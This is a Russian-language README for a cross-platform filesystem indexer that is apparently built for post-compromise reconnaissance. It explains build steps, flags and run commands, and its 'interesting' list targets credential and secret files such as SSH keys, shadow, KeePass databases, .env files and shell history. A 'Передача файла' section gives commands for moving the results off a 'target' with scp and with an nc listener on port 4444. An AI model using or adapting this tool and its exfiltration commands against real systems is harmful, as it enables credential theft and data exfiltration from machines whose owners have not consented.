# fs_index — Fast Cross-Platform Filesystem Indexer

Один бинарник, нет зависимостей, работает без прав администратора.
Ошибки доступа пишет в JSONL (`type: "error"`), не падает.

---

## Сборка

### Вариант 1 — Go в /tmp (ничего не ставится в систему)

```bash
cd /tmp
wget https://go.dev/dl/go1.22.3.linux-amd64.tar.gz
tar -xzf go1.22.3.linux-amd64.tar.gz

# Собрать (запускать из папки с fs_index.go)
/tmp/go/bin/go build -ldflags="-s -w" -o fs_index_linux_x64   fs_index.go
GOOS=windows GOARCH=amd64 /tmp/go/bin/go build -ldflags="-s -w" -o fs_index_win_x64.exe  fs_index.go
GOOS=windows GOARCH=386   /tmp/go/bin/go build -ldflags="-s -w" -o fs_index_win_x86.exe  fs_index.go
GOOS=linux   GOARCH=arm64 /tmp/go/bin/go build -ldflags="-s -w" -o fs_index_linux_arm64  fs_index.go
GOOS=darwin  GOARCH=amd64 /tmp/go/bin/go build -ldflags="-s -w" -o fs_index_mac_x64      fs_index.go
GOOS=darwin  GOARCH=arm64 /tmp/go/bin/go build -ldflags="-s -w" -o fs_index_mac_arm64    fs_index.go

# Убрать Go
rm -rf /tmp/go /tmp/go1.22.3.linux-amd64.tar.gz
```

### Вариант 2 — Docker (не трогает систему совсем)

```bash
# Linux / Mac
docker run --rm -v "$(pwd)":/work -w /work golang:1.22-alpine sh -c "
  GOOS=windows GOARCH=amd64 go build -ldflags='-s -w' -o fs_index_win_x64.exe fs_index.go &&
  GOOS=linux   GOARCH=amd64 go build -ldflags='-s -w' -o fs_index_linux_x64   fs_index.go
"

# Windows PowerShell
docker run --rm -v "${PWD}:/work" -w /work golang:1.22-alpine sh -c "
  GOOS=windows GOARCH=amd64 go build -ldflags='-s -w' -o fs_index_win_x64.exe fs_index.go &&
  GOOS=linux   GOARCH=amd64 go build -ldflags='-s -w' -o fs_index_linux_x64   fs_index.go
"
```

---

## Флаги

| Флаг | По умолчанию | Описание |
|---|---|---|
| `-root` | `/` на Unix, все диски на Windows | Корневые пути через запятую |
| `-out` | `fs_index.jsonl` | Выходной файл |
| `-workers` | CPU×8 (макс 64) | Число параллельных воркеров |
| `-skip` | `proc,sys,dev,run` (Unix) | Имена директорий пропустить |
| `-max-depth` | `0` (без лимита) | Максимальная глубина обхода |
| `-interesting-only` | `false` | Только интересные файлы + ошибки (в 10-50× меньше) |
| `-gz` | `false` | Gzip сжатие вывода (добавляет `.gz` к имени) |

---

## Запуск

### Типичные сценарии (от меньшего к большему)

```bash
# Минимальный — только интересное, сжато (~100-500 KB вместо 30+ MB)
./fs_index_linux_x64 -workers 4 -interesting-only -gz -skip "proc,sys,dev,run,snap" -out out.jsonl.gz

# Конкретные папки + только интересное
./fs_index_linux_x64 -root "/home,/etc,/var,/opt,/root" -interesting-only -gz -out out.jsonl.gz

# Полный индекс сжатый (30 MB → 2-4 MB)
./fs_index_linux_x64 -workers 4 -skip "proc,sys,dev,run,snap" -gz -out out.jsonl.gz

# Полный индекс без сжатия
./fs_index_linux_x64 -workers 4 -skip "proc,sys,dev,run,snap" -out out.jsonl
```

### Windows

```powershell
# Минимальный — только интересное, сжато
fs_index_win_x64.exe -interesting-only -gz -out out.jsonl.gz

# Полный сжатый
fs_index_win_x64.exe -workers 4 -gz -out out.jsonl.gz

# Конкретные диски
fs_index_win_x64.exe -root "C:\,D:\" -interesting-only -gz -out out.jsonl.gz
```

---

## Ожидаемые размеры файлов

| Режим | Типичный Linux | Типичный Windows |
|---|---|---|
| Полный JSONL | 30-100 MB | 50-200 MB |
| Полный + `-gz` | 3-8 MB | 5-15 MB |
| `-interesting-only` | 1-5 MB | 2-10 MB |
| `-interesting-only -gz` | **100-500 KB** | **200 KB - 1 MB** |

---

## Советы по скорости

| Ситуация | Рекомендация |
|---|---|
| VM / HDD | `-workers 4` |
| NVMe / физическая машина | `-workers 32` или больше |
| Только разведка | `-root "/home,/etc,/var"` вместо `/` |
| Linux — завис | Добавить `-skip "proc,sys,dev,run"` (обязательно!) |
| Нужна только структура | `-max-depth 4` |

---

## Передача файла

```bash
# Просто скопировать (scp)
scp user@target:/tmp/out.jsonl.gz ./

# Через nc если нет ssh (на цели)
nc -lvp 4444 < /tmp/out.jsonl.gz
# (у себя)
nc <target_ip> 4444 > out.jsonl.gz

# Посмотреть без распаковки (через zcat / jq)
zcat out.jsonl.gz | jq 'select(.interesting == true)'
```

---

## Формат вывода (JSONL)

Первая строка — метаданные:
```json
{"_meta":true,"roots":["/"],"os":"linux","arch":"amd64","workers":4,"interesting_only":true,"started":"2025-03-09T12:00:00Z"}
```

Файл:
```json
{"path":"/home/user/.ssh/id_rsa","name":"id_rsa","size":1234,"type":"file","mtime":"2024-01-15T08:30:00Z","mode":"0600","interesting":true}
```

Ошибка доступа (не падает, всегда в выводе):
```json
{"path":"/root/.ssh","name":".ssh","type":"error","error":"open /root/.ssh: permission denied"}
```

| Поле | Описание |
|---|---|
| `path` | Полный путь |
| `name` | Имя файла/папки |
| `ext` | Расширение (lowercase) |
| `size` | Размер в байтах |
| `type` | `file` / `dir` / `symlink` / `error` |
| `mtime` | Время изменения (UTC) |
| `mode` | Права в octal |
| `interesting` | `true` если расширение/имя в списке интересных |
| `error` | Текст ошибки |

---

## Вьювер лежит в /web

---

## Что помечается как interesting

**Расширения:** `.key .pem .p12 .pfx .ppk .kdbx .env .config .cfg .ini .sql .db .sqlite
.bak .old .ps1 .bat .sh .htpasswd .ovpn .rdp .log .xlsx .csv .json .yaml .zip .7z ...`

**Имена файлов:** `id_rsa id_dsa .netrc .bash_history passwd shadow authorized_keys
credentials secrets .env web.config appsettings.json docker-compose.yml ...`
